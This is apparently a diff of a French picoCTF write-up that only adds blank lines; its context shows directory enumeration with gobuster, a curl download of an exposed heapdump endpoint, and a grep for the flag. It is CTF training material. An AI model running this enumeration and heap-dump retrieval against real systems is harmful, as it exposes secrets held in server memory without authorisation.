@@ -32,10 +32,13 @@ répertoires accessibles sur cette URL.
 ![urlwebpage](images/1.jpeg) 
 
 
+
+
 >> "gobuster dir -u 'URL' -w '/usr/share/seclists/
    Discovery/Web-Content/common.txt'" utilisé pour
    découvrir les différents endpoints accessibles.
 ![enumeration](images/2.jpeg) 
+
 
 
 >> "curl -X GET 'url/heapdump' --output file"
@@ -45,9 +48,11 @@ répertoires accessibles sur cette URL.
 ![urlwebpage](images/3.jpeg) 
 
 
+
 >> "cat file | grep -o 'picoCTF{.*}'" pour
    rechercher si le flag se trouve dans ce fichier.
 ![urlwebpage](images/4.jpeg) 
+
 
 
 ## Step 3 — Solution
